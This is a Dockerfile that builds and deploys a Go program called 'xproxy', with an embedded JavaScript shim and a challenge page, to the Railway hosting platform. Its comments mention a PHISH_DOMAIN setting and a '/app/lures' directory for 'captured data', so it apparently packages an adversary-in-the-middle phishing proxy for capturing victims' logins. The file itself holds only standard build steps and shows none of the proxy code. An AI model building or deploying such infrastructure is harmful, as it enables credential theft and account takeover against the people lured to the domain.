# ---- Build stage ----
FROM golang:1.26-alpine AS build

WORKDIR /src

# Cache dependencies first.
COPY go.mod go.sum ./
RUN go mod download

# Copy source, the embedded client-side shim, and challenge page, then build a static binary.
COPY *.go shim.js challenge.html ./
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \
    -ldflags="-s -w" \
    -trimpath \
    -o /out/xproxy .

# ---- Runtime stage ----
FROM alpine:3.19

RUN apk add --no-cache ca-certificates tzdata \
    && addgroup -S app && adduser -S -G app app

WORKDIR /app

COPY --from=build /out/xproxy /app/xproxy

# Captured data is persisted here. Railway's volume can mount onto it.
RUN mkdir -p /app/lures && chown -R app:app /app

USER app

# Railway injects PORT (the edge-routed public port). The proxy listens on it.
EXPOSE 8080

# -domain comes from PHISH_DOMAIN env (your Railway-generated domain or a
# custom domain you attach). -addr defaults to ADDR/PORT.
ENTRYPOINT ["/app/xproxy"]
